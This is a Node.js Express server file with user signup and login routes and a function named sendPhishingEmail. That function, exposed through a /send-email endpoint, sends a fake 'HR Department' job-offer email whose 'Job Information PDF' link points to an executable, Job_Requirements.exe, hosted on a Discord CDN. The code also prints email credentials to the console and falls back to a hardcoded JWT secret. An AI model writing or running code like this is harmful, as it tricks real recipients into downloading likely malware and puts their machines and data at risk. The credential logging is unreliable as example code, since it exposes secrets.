const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const bcrypt = require("bcrypt");
const jwt = require("jsonwebtoken");
const nodemailer = require("nodemailer");
console.log("Email User:", process.env.EMAIL_USER);
console.log("Email Pass:", process.env.EMAIL_PASS);

require("dotenv").config(); // Load environment variables

const app = express();
const PORT = 5000;

// Middleware
app.use(express.json());
app.use(cors());

// MongoDB Connection
mongoose.connect(process.env.MONGO_URI, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
})
  .then(() => console.log("MongoDB connected"))
  .catch(err => console.error("MongoDB connection error:", err));

// Define a User Schema
const userSchema = new mongoose.Schema({
  email: { type: String, required: true, unique: true },
  password: { type: String, required: true },
});

const User = mongoose.model("User", userSchema);

// Secret key for JWT (Ensure this is in .env for security)
const SECRET_KEY = process.env.JWT_SECRET || "your_secret_key";

// Configure Email Sending
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.EMAIL_USER, // Gmail address
    pass: process.env.EMAIL_PASS, // App password
  },
});

// Function to send phishing email
async function sendPhishingEmail(targetEmail) {
  const mailOptions = {
    from: '"HR Department" <ransomlearn.hr@gmail.com>',
    to: targetEmail,
    subject: "Job Offer - Software Engineer Position",
    html: `
      <p>Dear Candidate,</p>
      <p>We are pleased to inform you that your profile matches our <b>Software Engineer</b> role at <b>XYZ Corp</b>. 
      Please find the job details in the document provided in the link.</p>
      <a href="https://cdn.discordapp.com/attachments/970018117893894165/1357369161856057497/Job_Requirements.exe?ex=67eff40a&is=67eea28a&hm=3994b39cd190d3c9b6541fd614c8e356342bd072539a152b26ae7dba344d4b91&">Job Information PDF</a>
      <p>Best Regards,<br>HR Team</p>
    `,
  };

  try {
    await transporter.sendMail(mailOptions);
    console.log("Phishing email sent to:", targetEmail);
  } catch (error) {
    console.error("Error sending email:", error);
  }
}

app.post("/send-email", async (req, res) => {
  const { email } = req.body;
  if (!email) return res.status(400).json({ error: "Email is required" });

  try {
    await sendPhishingEmail(email);
    res.json({ message: "Email sent successfully" });
  } catch (error) {
    console.error("Error sending email:", error);
    res.status(500).json({ error: error.message });
  }
});


// Signup Route
app.post("/signup", async (req, res) => {
  const { email, password } = req.body;

  try {
    const hashedPassword = await bcrypt.hash(password, 10);
    const newUser = new User({ email, password: hashedPassword });
    await newUser.save();
    res.status(200).json({ message: "User registered successfully" });
  } catch (err) {
    res.status(400).json({ error: "Error registering user" });
  }
});

// Login Route
app.post("/login", async (req, res) => {
  const { email, password } = req.body;

  try {
    const user = await User.findOne({ email });
    if (!user) {
      return res.status(400).json({ error: "User not found" });
    }

    const isMatch = await bcrypt.compare(password, user.password);
    if (!isMatch) {
      return res.status(400).json({ error: "Invalid credentials" });
    }

    const token = jwt.sign({ userId: user._id }, SECRET_KEY, { expiresIn: "1h" });

    res.status(200).json({ message: "Login successful", token });
  } catch (err) {
    res.status(500).json({ error: "Server error" });
  }
});

// Start Server
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
